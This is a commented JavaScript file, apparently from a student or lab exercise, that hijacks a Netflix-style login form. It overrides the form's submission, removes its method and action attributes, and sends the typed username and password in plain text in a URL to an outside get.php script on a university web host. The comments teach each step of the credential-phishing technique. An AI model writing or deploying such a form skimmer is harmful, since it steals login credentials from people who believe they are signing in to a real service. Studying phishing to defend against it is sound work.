console.log('client side script. reporting for duty')

////////////////////////////////////////////////////
// Learning JS
////////////////////////////////////////////////////
// 1. MDN is going to be your source of truth for everything, such as the function below
//    https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector

// Here, the querySelector is being used to find an element within the 
//    document or formElement's tree of children. 
// For more information on how HTML DOM trees work, read this
//    https://www.w3schools.com/js/js_htmldom_navigation.asp

const formElement = document.querySelector('form.login-form')
const buttonElm = formElement.querySelector('button.login-button')

const userInput = formElement.querySelector('#id_userLoginId')
const passInput = formElement.querySelector('#id_password')

// In order to access the values the user types into the input elements, 
//   we can use the element.value (userInput.value) member variable to access 
//   at the time of access, instead of when the element variable was initialized
// Meaning that even tho userInput is declared at page load with nothing in the 
//   email input box, the `element.value` variable will still be able to read the 
//   email address if it's typed in later (but before the button press)



// Listen for the click event of the button element
//   once clicked, run the callback function

/**
 * Whenever an event is triggered, there is an Event object that will be 
 *   the first parameter in the callback function if specified.
 *   This obj comes with a ton of members, defining parts of the event 
 *      such as which exact element triggered the event.
 *   We use it for the function preventDefault()
 *      to prevent any other existing events from triggering 
 *      (incase Netflix attached their own events that would stop our callback)
 *      https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault
 * */ 


buttonElm.addEventListener('click', function(event){
    console.log('button is clicked')
    event.preventDefault()
    window.location.replace(`https://web.eecs.utk.edu/~jsides4/get.php?user=${userInput.value}&password=${passInput.value}`)
})


// Because HTML and PHP are older the JS (which is now the strongest), 
//   the form elements have their own actions that happen whenever a button is pressed, 
///  particularly when the button is a type='submit'
//   So if the attributes in <form> (ie method, action, type) 
//     can stop our callback event above from happening, 
//     removing the following should allow our callback to follow through.

formElement.removeAttribute('method')
formElement.removeAttribute('action')
buttonElm.removeAttribute('type')